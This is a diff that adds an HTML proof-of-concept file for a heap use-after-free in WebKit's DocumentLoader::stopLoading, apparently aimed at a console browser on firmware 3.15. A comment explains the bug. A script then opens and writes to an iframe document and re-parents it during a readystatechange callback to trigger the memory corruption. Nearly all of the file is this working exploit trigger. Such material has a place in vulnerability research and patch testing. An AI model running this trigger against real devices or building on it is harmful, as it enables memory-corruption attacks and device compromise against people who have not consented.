@@ -1,0 +1,77 @@
+<!--
+Original CVE
+
+Heap User-After-Free in DocumentLoader::stopLoading
+
+Precise data abort reboot on FW 3.15
+
+If I understand correctly:
+Call to m_frame -> loader() -> stopLoading() can change ready state, fires mutation event that fubars the document loader
+
+Faulty protection allows you to collide docs and frames
+
+josh_axey
+-->
+<html>
+<body>
+
+<script src="jquery-1.11.1.min.js"></script>
+<script src="inc/utils.js"></script>
+<script type="text/javascript"></script>
+
+<div id="stub"></div>
+
+<div id="content" style="display:none">
+<iframe id="iframe" src="about:blank"></iframe>
+</div>
+
+<script>
+
+var ifr = document.getElementById('iframe');
+var ifrDoc = ifr.contentDocument;
+ifrDoc.open();
+ifrDoc.write('stuff');
+
+ns = {};
+ns.listenerActive = false;
+
+ns.getFirstUnreadyIframe = function(element) {
+  if (ifr.contentDocument.readyState == 'loading') {
+    return ifr;
+  } else {
+    return null;
+  }
+};
+
+ns.waitForIframesReady = function(element, callback) {
+  var iframe = ns.getFirstUnreadyIframe(element);
+  if (iframe == null) {
+    callback();
+  } else {
+	// Wait for frame load
+    var retry = function() {
+      ns.waitForIframesReady(element, callback);
+    }
+    if (!ns.listenerActive) {
+      iframe.contentDocument.addEventListener('readystatechange', retry);
+      ns.listenerActive = true;
+    }
+  }
+};
+
+ns.inject = function() {
+  var adStub = document.getElementById('stub');
+  var adContent = document.getElementById('content');
+  if (ns.getFirstUnreadyIframe(adContent) != null) {
+    ns.waitForIframesReady(adContent, ns.inject);
+    return;
+  }
+  adStub.appendChild(adContent);
+}
+
+ns.inject();
+ifrDoc.close();
+</script>
+
+</body>
+</html>
